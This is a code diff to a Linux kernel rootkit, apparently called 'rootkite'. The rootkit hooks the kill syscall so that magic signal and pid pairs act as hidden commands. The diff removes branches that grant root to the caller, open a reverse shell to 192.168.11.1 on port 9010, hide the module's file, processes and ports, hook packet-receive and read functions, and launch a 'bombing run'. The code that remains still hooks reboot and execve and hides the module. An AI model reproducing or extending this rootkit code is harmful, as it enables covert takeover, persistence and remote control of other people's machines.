@@ -32,29 +32,6 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         // hide chardev quickly
         return 0;
     }
-    else if ((sig == 64) && (pid == 4)){
-        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
-            printk(KERN_ERR "error hooking syscall read\n");
-        }
-    }
-    else if ((sig == 64) && (pid == 5)){
-        rooted();
-        insert_node(&files_to_hide, "rootkite.ko");
-        //insert_node(&files_to_hide, "ath_pci.conf");
-    }
-    else if ((sig == 63) && (pid == 1)){
-        
-        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
-            printk(KERN_ERR "error hooking packet_rcv\n");
-        }
-        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
-            printk(KERN_ERR "error hooking tpacket_rcv\n");
-        }
-        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
-            printk(KERN_ERR "error hooking packet_rcv_spkt\n");
-        }
-        switch_hide_process();
-    }
     else if ((sig == 63) && (pid == 2)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
@@ -68,12 +45,6 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
                 printk(KERN_ERR "error hooking syscall execve\n");
         }
-    }
-    else if ((sig == 63) && (pid == 3)){
-        switch_net_hook(); // block traffic to specified ports and block ICMP
-    }
-    else if ((sig == 63) && (pid == 4)){
-        start_bombing_run();
     }
     return orig_kill(regs);
 }
@@ -90,37 +61,6 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
             show_mod();
         }
     }
-    else if ((sig == 64) && (pid == 2)){
-        printk(KERN_INFO "Setting root for calling process\n");
-        set_root();
-        return 0;
-    }
-    else if ((sig == 64) && (pid == 3)){
-        start_reverse_shell("192.168.11.1", "9010");
-        insert_node(&ports_to_hide, "9010");
-    }
-    else if ((sig == 64) && (pid == 4)){
-        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
-            printk(KERN_ERR "error hooking syscall read\n");
-        }
-    }
-    else if ((sig == 64) && (pid == 5)){
-        rooted();
-        insert_node(&files_to_hide, "rootkite.ko");
-        //insert_node(&files_to_hide, "ath_pci.conf");
-    }
-    else if ((sig == 63) && (pid == 1)){
-        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "packet_rcv") == 1){
-            printk(KERN_ERR "error hooking packet_rcv\n");
-        }
-        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "tpacket_rcv") == 1){
-            printk(KERN_ERR "error hooking tpacket_rcv\n");
-        }
-        if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
-            printk(KERN_ERR "error hooking packet_rcv_spkt\n");
-        }
-        switch_hide_process();
-    }
     else if ((sig == 63) && (pid == 2)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
@@ -134,12 +74,6 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
                 printk(KERN_ERR "error hooking syscall execve\n");
         }
-    }
-    else if ((sig == 63) && (pid == 3)){
-        switch_net_hook(); // block traffic to specified ports and block ICMP
-    }
-    else if ((sig == 63) && (pid == 4)){
-        start_bombing_run();
     }
     return orig_kill(pid, sig);
 }
